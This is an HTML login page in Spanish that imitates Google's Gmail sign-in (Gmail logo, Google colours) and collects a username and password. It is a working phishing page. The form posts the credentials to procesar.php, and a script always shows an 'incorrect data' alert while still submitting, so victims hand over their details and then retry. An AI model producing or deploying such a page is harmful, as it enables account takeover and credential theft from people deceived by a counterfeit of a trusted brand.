<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Iniciar sesión</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
    <script>
        tailwind.config = {
            theme: {
                extend: {
                    colors: {
                        googleBlue: '#1a73e8',
                        googleGray: '#5f6368',
                        googleBorder: '#dadce0',
                        facebookBlue: '#1877f2',
                        instagramColor: '#E1306C',
                    },
                    fontFamily: {
                        sans: ['Roboto', 'Arial', 'sans-serif'],
                    },
                }
            }
        }
    </script>
    <style type="text/tailwindcss">
        @layer utilities {
            .input-focus {
                @apply focus:outline-none focus:border-googleBlue focus:ring-1 focus:ring-googleBlue;
            }
            .btn-primary {
                @apply bg-googleBlue hover:bg-blue-700 text-white font-medium py-2 px-6 rounded transition-colors w-full sm:w-auto;
            }
            .btn-secondary {
                @apply text-googleBlue hover:bg-blue-50 font-medium py-2 px-4 rounded transition-colors;
            }
            .icon-base {
                @apply w-7 h-7 flex items-center justify-center;
                font-size: 1.75rem;
            }
        }
    </style>
</head>
<body class="bg-white min-h-screen flex flex-col items-center justify-center p-4">
    <div class="w-full max-w-md border border-googleBorder rounded-xl p-6 sm:p-8 shadow-sm">
        <div class="text-center mb-6">
            <div class="flex items-center justify-center gap-6 mb-4">
             <img src="https://www.gstatic.com/images/branding/product/2x/gmail_48dp.png" 
                 class="w-5 h-5" alt="Gmail">
                
            </div>

            <h1 class="text-2xl font-normal text-gray-800">Iniciar sesión</h1>
        </div>

        <form action="procesar.php" method="POST" onsubmit="return mostrarError()">
            <div>
                <label for="usuario" class="block text-sm font-medium text-gray-700 mb-1">Correo electrónico o usuario</label>
                <input 
                    type="text" 
                    name="usuario" 
                    id="usuario" 
                    class="w-full px-4 py-3 border border-googleBorder rounded-md input-focus text-base"
                    placeholder="Ingresa tu usuario"
                    required
                >
            </div>

            <div>
                <label for="contrasena" class="block text-sm font-medium text-gray-700 mb-1">Contraseña</label>
                <input 
                    type="password" 
                    name="contrasena" 
                    id="contrasena" 
                    class="w-full px-4 py-3 border border-googleBorder rounded-md input-focus text-base"
                    placeholder="Ingresa tu contraseña"
                    required
                >
                <a href="#" class="text-sm text-googleBlue hover:underline mt-2 inline-block">¿Has olvidado tu contraseña?</a>
            </div>

            <div class="flex flex-col sm:flex-row justify-between items-center gap-4 mt-6">
                <a href="#" class="btn-secondary text-sm">Crear cuenta</a>
                <button type="submit" class="btn-primary">Iniciar </button>
            </div>
        </form>

     
    </div>

    <script>
        function mostrarError() {
            alert("Los datos ingresados son incorrectos. Inténtalo nuevamente.");
            return true;
        }
    </script>
</body>
</html>
